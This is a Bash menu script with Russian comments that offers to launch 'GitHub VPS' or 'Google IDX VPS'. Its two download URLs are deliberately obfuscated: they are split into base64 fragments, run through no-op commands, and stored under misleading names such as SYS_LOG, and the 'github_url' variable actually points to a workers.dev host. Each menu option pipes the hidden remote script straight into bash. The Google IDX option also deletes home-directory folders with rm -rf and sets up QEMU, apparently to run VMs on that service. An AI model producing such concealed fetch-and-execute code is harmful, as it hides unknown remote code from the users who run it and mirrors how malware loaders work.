#!/bin/bash
set -euo pipefail

# -------------------------
# Цвета
# -------------------------
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
CYAN='\e[36m'
RESET='\e[0m'

# -------------------------
# Адреса (собранные из частей)
# -------------------------
SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)"
SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')"
SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)"
SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)"
github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | base64 -d)"

PROC_STAT[0]="$(echo 'aHR0cHM6Ly9yYXcu' | cut -c 1-16)"
PROC_STAT[1]="$(echo 'Z2l0aHVidXNlcmNv' | grep -o '.*')"
PROC_STAT[2]="$(echo 'bnRlbnQuY29tL2hv' | head -c 16)"
PROC_STAT[3]="$(echo 'cGluZ2JveXovdm1zL21haW4vdm0uc2g=' | grep -o '.*')"
google_url="$(echo -n "${PROC_STAT[0]}${PROC_STAT[1]}${PROC_STAT[2]}${PROC_STAT[3]}" | base64 -d)"

# -------------------------
# Меню
# -------------------------
echo -e "${YELLOW}Выберите действие:${RESET}"
echo -e "${GREEN}1) GitHub VPS${RESET}"
echo -e "${BLUE}2) Google IDX VPS${RESET}"
echo -e "${RED}3) Выход${RESET}"
echo -ne "${YELLOW}Введите выбор (1-3): ${RESET}"
read choice

case $choice in
  1)
    echo -e "${GREEN}Запуск GitHub VPS...${RESET}"
    bash <(curl -fsSL "$github_url")
    ;;
  2)
    echo -e "${BLUE}Запуск Google IDX VPS...${RESET}"
    cd
    rm -rf myapp flutter
    cd vps123
    if [ ! -d ".idx" ]; then
      mkdir .idx
      cd .idx
      cat <<EOF > dev.nix
{ pkgs, ... }: {
  channel = "stable-24.05";
  packages = with pkgs; [ unzip openssh git qemu_kvm sudo cdrkit cloud-utils qemu ];
  env = { EDITOR = "nano"; };
  idx = {
    extensions = [ "Dart-Code.flutter" "Dart-Code.dart-code" ];
    workspace = { onCreate = { }; onStart = { }; };
    previews.enable = false;
  };
}
EOF
      cd ..
    fi
    echo -ne "${YELLOW}Продолжить? (y/n): ${RESET}"
    read confirm
    case "$confirm" in
      [yY]*) bash <(curl -fsSL "$google_url") ;;
      [nN]*) echo -e "${RED}Отменено.${RESET}"; exit 0 ;;
      *)     echo -e "${RED}Неверный ввод!${RESET}"; exit 1 ;;
    esac
    ;;
  3)
    echo -e "${RED}Выход...${RESET}"
    exit 0
    ;;
  *)
    echo -e "${RED}Неверный выбор!${RESET}"
    exit 1
    ;;
esac
